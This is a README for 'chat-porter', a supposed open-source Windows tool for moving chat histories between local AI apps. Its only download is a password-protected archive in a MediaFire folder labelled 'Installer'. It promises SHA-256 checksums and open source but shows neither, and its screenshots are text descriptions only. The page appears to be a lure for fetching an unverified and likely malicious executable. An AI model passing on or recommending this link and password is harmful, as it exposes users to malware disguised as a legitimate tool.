# chat-porter

📤 Free, open-source chat history porter for Windows — move conversations between local AI apps intact. 100 MB portable, offline, MIT, no cloud.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Format detection** — drop a SillyTavern, Open WebUI or KoboldCpp export and it recognizes the shape
- ✅ **Cross-app conversion** — conversations converted to the target app's native format with roles intact
- ✅ **Merge and split** — combine two exports into one archive or split a giant thread by date
- ✅ **Metadata mapping** — character names, timestamps and system prompts carried over where the formats allow
- ✅ **Markdown archive** — any conversation exportable as a readable .md file for backups
- ✅ **Dry-run preview** — see exactly what will be imported before anything touches your app folder
- ✅ **100 MB self-contained exe** — runtime bundled, portable, fully offline, MIT with SHA-256 releases

## Why chat-porter

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **chat-porter** | Manual JSON editing | App exporters | Cloud chat viewers |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Built-in | Free accounts |
| Open source | **Yes** | N/A | Partial | No |
| Cross-app conversion | **Yes** | Painful | One direction | No
| Conversation merge and split | **Yes** | No | No | No
| Dry-run preview | **Yes** | No | No | No
| Portable, no install | **Yes, 100 MB** | Editor | N/A | Browser

## FAQ

**how to move chat history from SillyTavern to another local AI app?**

Every app invents its own chat JSON, so moving a year of conversations means hand-editing files until something loads. chat-porter detects formats, converts roles and metadata, and previews the import before writing. It is a 100 MB portable exe, MIT, and the chats never leave the disk.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark porter (#121418, indigo #6366F1): drop zone with a detected badge reading SillyTavern JSONL, target app dropdown set to Open WebUI, preview list of conversations.
2. Mapping table: source fields left, target fields right, three auto-mapped rows in green, one manual choice dropdown for character card link.
3. Merge tool: two archives selected with overlap warning count, split-by-date option, dry-run report panel, export button enabled.

## Download

| Source | Link |
|---|---|
| 💾 **Installer chat-porter** | [Installer chat-porter](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).